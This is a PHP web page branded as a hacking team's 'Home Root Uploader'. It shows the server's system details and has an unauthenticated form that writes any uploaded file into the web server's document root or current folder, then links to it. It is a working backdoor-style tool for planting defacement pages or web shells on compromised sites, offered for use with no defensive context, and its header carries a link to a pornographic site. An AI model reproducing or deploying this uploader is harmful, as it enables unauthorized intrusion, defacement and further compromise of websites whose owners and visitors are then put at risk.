<!DOCTYPE HTML>
<HTML>
<HEAD>
<link href="http://fonts.googleapis.com/css?family=Jolly+Lodger" rel="stylesheet" type="text/css">
<font face="jolly lodger" color="black" size="3">##TangerangXploit Team Home Root Uploader## <br> Created By Mr.D30 <br> www.xnxx.com/
<center>
   <img src="https://b.top4top.io/p_17143s5sr0.png">
   <center>
<?php

echo "..... <br>";

echo "<b>".php_uname()."</b><br>";

echo "<form method='post' enctype='multipart/form-data'>

	 <input type='file' name='idx_file'>

	 <input type='submit' name='upload' value='upload'>

	 </form>";

$root = $_SERVER['DOCUMENT_ROOT'];

$files = $_FILES['idx_file']['name'];

$dest = $root.'/'.$files;

if(isset($_POST['upload'])) {

	if(is_writable($root)) {

		if(@copy($_FILES['idx_file']['tmp_name'], $dest)) {

			$web = "http://".$_SERVER['HTTP_HOST']."/";

			echo "sukses upload -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";

		} else {

			echo "gagal upload di document root.";

		}

	} else {

		if(@copy($_FILES['idx_file']['tmp_name'], $files)) {

			echo "sukses upload <b>$files</b> di folder ini";

		} else {

			echo "gagal upload";

		}

	}

}

?>
